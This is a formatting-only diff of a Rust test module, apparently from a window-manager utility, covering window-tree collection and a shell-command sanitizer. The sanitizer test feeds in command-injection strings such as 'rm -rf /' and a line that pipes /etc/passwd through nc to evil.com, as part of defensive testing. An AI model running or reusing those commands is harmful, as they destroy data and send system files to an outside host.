@@ -621,9 +621,15 @@ mod tests {
         }
 
         let mut clients = Vec::new();
-        let ws = WmWorkspace { id: 0, name: "1".to_string() };
+        let ws = WmWorkspace {
+            id: 0,
+            name: "1".to_string(),
+        };
         tree::collect_windows_with_context(&node, &mut clients, &ws, 0, false);
-        assert!(clients.is_empty(), "window beyond MAX_TREE_DEPTH should not be collected");
+        assert!(
+            clients.is_empty(),
+            "window beyond MAX_TREE_DEPTH should not be collected"
+        );
     }
 
     #[test]
@@ -672,30 +678,59 @@ mod tests {
             "floating_nodes": []
         });
         let clients = tree::collect_clients_from_tree(&tree_val);
-        assert!(clients.is_empty(), "node without app_id or window_properties should be skipped");
+        assert!(
+            clients.is_empty(),
+            "node without app_id or window_properties should be skipped"
+        );
     }
 
     #[test]
     fn sanitize_exec_strips_dangerous_chars() {
         assert_eq!(super::super::sanitize_exec_command("firefox"), "firefox");
-        assert_eq!(super::super::sanitize_exec_command("firefox; rm -rf /"), "firefox rm -rf /");
-        assert_eq!(super::super::sanitize_exec_command("echo $HOME"), "echo HOME");
-        assert_eq!(super::super::sanitize_exec_command("firefox\nrm -rf /"), "firefoxrm -rf /");
-        assert_eq!(super::super::sanitize_exec_command("echo `whoami`"), "echo whoami");
-        assert_eq!(super::super::sanitize_exec_command("cat /etc/passwd | nc evil.com 1234"), "cat /etc/passwd  nc evil.com 1234");
-        assert_eq!(super::super::sanitize_exec_command("evil && rm -rf /"), "evil  rm -rf /");
+        assert_eq!(
+            super::super::sanitize_exec_command("firefox; rm -rf /"),
+            "firefox rm -rf /"
+        );
+        assert_eq!(
+            super::super::sanitize_exec_command("echo $HOME"),
+            "echo HOME"
+        );
+        assert_eq!(
+            super::super::sanitize_exec_command("firefox\nrm -rf /"),
+            "firefoxrm -rf /"
+        );
+        assert_eq!(
+            super::super::sanitize_exec_command("echo `whoami`"),
+            "echo whoami"
+        );
+        assert_eq!(
+            super::super::sanitize_exec_command("cat /etc/passwd | nc evil.com 1234"),
+            "cat /etc/passwd  nc evil.com 1234"
+        );
+        assert_eq!(
+            super::super::sanitize_exec_command("evil && rm -rf /"),
+            "evil  rm -rf /"
+        );
     }
 
     #[test]
     fn run_command_error_json() {
         let reply = serde_json::json!([{"success": false, "error": "No matching node"}]);
-        let results: Vec<serde_json::Value> = serde_json::from_value(reply).expect("valid JSON array");
+        let results: Vec<serde_json::Value> =
+            serde_json::from_value(reply).expect("valid JSON array");
         let first = results.first().expect("should have one result");
         assert_eq!(first.get("success").and_then(|v| v.as_bool()), Some(false));
-        assert_eq!(first.get("error").and_then(|v| v.as_str()).unwrap(), "No matching node");
+        assert_eq!(
+            first.get("error").and_then(|v| v.as_str()).unwrap(),
+            "No matching node"
+        );
 
         let ok_reply = serde_json::json!([{"success": true}]);
-        let ok_results: Vec<serde_json::Value> = serde_json::from_value(ok_reply).expect("valid JSON array");
-        assert_eq!(ok_results[0].get("success").and_then(|v| v.as_bool()), Some(true));
+        let ok_results: Vec<serde_json::Value> =
+            serde_json::from_value(ok_reply).expect("valid JSON array");
+        assert_eq!(
+            ok_results[0].get("success").and_then(|v| v.as_bool()),
+            Some(true)
+        );
     }
 }
